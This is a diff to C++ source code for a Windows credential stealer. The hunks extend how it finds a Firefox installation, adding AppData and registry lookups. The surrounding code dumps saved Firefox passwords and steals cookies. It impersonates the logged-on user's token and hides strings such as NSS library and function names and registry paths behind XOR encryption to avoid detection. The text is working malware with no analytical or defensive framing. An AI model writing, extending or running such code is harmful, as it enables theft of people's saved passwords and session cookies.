@@ -24,6 +24,11 @@ namespace credential {
         // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
         const wchar_t kMozillaFirefoxEnc[] = { L'\x06', L'\x70', L'\xf6', L'\x57', L'\x27', L'\x73', L'\xed', L'\x1e', L'\x0d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\0' };
         const wchar_t kFirefoxProfilesEnc[] = { L'\x06', L'\x70', L'\xf6', L'\x57', L'\x27', L'\x73', L'\xed', L'\x62', L'\x0d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\x62', L'\x1b', L'\x6d', L'\xe3', L'\x58', L'\x22', L'\x73', L'\xe9', L'\x4d', L'\0' };
+
+        const wchar_t kRegMozillaEnc[] = { L'\x18', L'\x50', L'\xca', L'\x6a', L'\x1c', L'\x5e', L'\xde', L'\x7b', L'\x17', L'\x52', L'\xe3', L'\x44', L'\x22', L'\x73', L'\xe0', L'\x5f', L'\x17', L'\x52', L'\xe3', L'\x44', L'\x22', L'\x73', L'\xe0', L'\x5f', L'\x6b', L'\x59', L'\xe5', L'\x4c', L'\x2e', L'\x79', L'\xe3', L'\x46', L'\0' };
+        const wchar_t kRegCurrentVersionEnc[] = { L'\x08', L'\x6a', L'\xfe', L'\x4c', L'\x2e', L'\x71', L'\xf8', L'\x68', L'\x2e', L'\x6d', L'\xff', L'\x57', L'\x24', L'\x71', L'\0' };
+        const wchar_t kRegInstallDirEnc[] = { L'\x06', L'\x7e', L'\xe5', L'\x50', L'\x17', L'\x56', L'\xe2', L'\x4d', L'\x3f', L'\x7e', L'\xe0', L'\x52', L'\x6b', L'\x5b', L'\xe5', L'\x4c', L'\x2e', L'\x7c', L'\xf8', L'\x51', L'\x39', L'\x66', L'\0' };
+        const wchar_t kRegAppPathsEnc[] = { L'\x18', L'\x50', L'\xca', L'\x6a', L'\x1c', L'\x5e', L'\xde', L'\x7b', L'\x17', L'\x52', L'\xe5', L'\x5d', L'\x39', L'\x70', L'\xff', L'\x51', L'\x2d', L'\x6b', L'\xd0', L'\x69', L'\x22', L'\x71', L'\xe8', L'\x51', L'\x3c', L'\x6c', L'\xd0', L'\x7d', L'\x3e', L'\x6d', L'\xfe', L'\x5b', L'\x25', L'\x6b', L'\xda', L'\x5b', L'\x39', L'\x6c', L'\xe5', L'\x51', L'\x25', L'\x43', L'\xcd', L'\x4e', L'\x3b', L'\x3f', L'\xdc', L'\x5f', L'\x3f', L'\x77', L'\xff', L'\x62', L'\x2d', L'\x76', L'\xfe', L'\x5b', L'\x2d', L'\x70', L'\xf4', L'\x10', L'\x2e', L'\x67', L'\xe9', L'\0' };
         const wchar_t kNssDllEnc[] = { L'\x25', L'\x6c', L'\xff', L'\x0d', L'\x65', L'\x7b', L'\xe0', L'\x52', L'\0' };
         const wchar_t kNssInitEnc[] = { L'\x05', L'\x4c', L'\xdf', L'\x61', L'\x02', L'\x71', L'\xe5', L'\x4a', L'\0' };
         const wchar_t kNssShutdownEnc[] = { L'\x05', L'\x4c', L'\xdf', L'\x61', L'\x18', L'\x77', L'\xf9', L'\x4a', L'\x2f', L'\x70', L'\xfb', L'\x50', L'\0' };
@@ -45,15 +50,61 @@ namespace credential {
 
         std::string FindFirefoxInstallPath() {
             char path[MAX_PATH];
-            std::string mozillaFirefox = utils::ws2s(utils::DecryptW(kMozillaFirefoxEnc, wcslen(kMozillaFirefoxEnc)));
+            std::wstring mozillaFirefox = utils::DecryptW(kMozillaFirefoxEnc, wcslen(kMozillaFirefoxEnc));
+
+            // 1. Check Standard Program Files
             if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
-                std::string p = std::string(path) + "\\" + mozillaFirefox;
+                std::string p = std::string(path) + "\\" + utils::ws2s(mozillaFirefox);
                 if (fs::exists(p)) return p;
             }
             if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path))) {
-                std::string p = std::string(path) + "\\" + mozillaFirefox;
+                std::string p = std::string(path) + "\\" + utils::ws2s(mozillaFirefox);
                 if (fs::exists(p)) return p;
             }
+
+            // 2. Check User Local AppData (User-level install)
+            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
+                std::string p = std::string(path) + "\\" + utils::ws2s(mozillaFirefox);
+                if (fs::exists(p)) return p;
+            }
+
+            // 3. Check Registry for Install Directory
+            HKEY hKey;
+            std::wstring regMozilla = utils::DecryptW(kRegMozillaEnc, wcslen(kRegMozillaEnc));
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regMozilla.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                wchar_t version[256];
+                DWORD sz = sizeof(version);
+                std::wstring regVer = utils::DecryptW(kRegCurrentVersionEnc, wcslen(kRegCurrentVersionEnc));
+                if (RegQueryValueExW(hKey, regVer.c_str(), NULL, NULL, (LPBYTE)version, &sz) == ERROR_SUCCESS) {
+                    std::wstring subKey = regMozilla + L"\\" + version + L"\\" + utils::DecryptW(kRegInstallDirEnc, wcslen(kRegInstallDirEnc));
+                    HKEY hSubKey;
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+                        wchar_t installDir[MAX_PATH];
+                        sz = sizeof(installDir);
+                        if (RegQueryValueExW(hSubKey, NULL, NULL, NULL, (LPBYTE)installDir, &sz) == ERROR_SUCCESS) {
+                            RegCloseKey(hSubKey);
+                            RegCloseKey(hKey);
+                            return utils::ws2s(installDir);
+                        }
+                        RegCloseKey(hSubKey);
+                    }
+                }
+                RegCloseKey(hKey);
+            }
+
+            // 4. Check App Paths
+            std::wstring regAppPaths = utils::DecryptW(kRegAppPathsEnc, wcslen(kRegAppPathsEnc));
+            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regAppPaths.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                wchar_t installPath[MAX_PATH];
+                DWORD sz = sizeof(installPath);
+                if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)installPath, &sz) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                    std::string p = utils::ws2s(installPath);
+                    return fs::path(p).parent_path().string();
+                }
+                RegCloseKey(hKey);
+            }
+
             return "";
         }
 
@@ -106,11 +157,15 @@ namespace credential {
     std::string DumpFirefoxPasswords() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
+        if (impersonated) report += "[+] Running with impersonated user token.\n";
+
         std::string firefoxPath = FindFirefoxInstallPath();
         if (firefoxPath.empty()) {
+            LOG_DEBUG("Firefox installation not found in standard paths or registry.");
             if (impersonated) utils::RevertToSelf();
             return report + "Firefox not found.";
         }
+        LOG_DEBUG("Firefox install found: " + firefoxPath);
         std::vector<std::string> profiles = FindFirefoxProfiles();
         if (profiles.empty()) {
             if (impersonated) utils::RevertToSelf();
@@ -168,6 +223,7 @@ namespace credential {
         bool impersonated = utils::ImpersonateLoggedOnUser();
         std::stringstream ss;
         ss << "# FIREFOX COOKIE STEALER RESULTS\n";
+        if (impersonated) ss << "# [+] Running with impersonated user token.\n";
         std::vector<std::string> profiles = FindFirefoxProfiles();
         int count = 0;
         for (const auto& profile : profiles) {
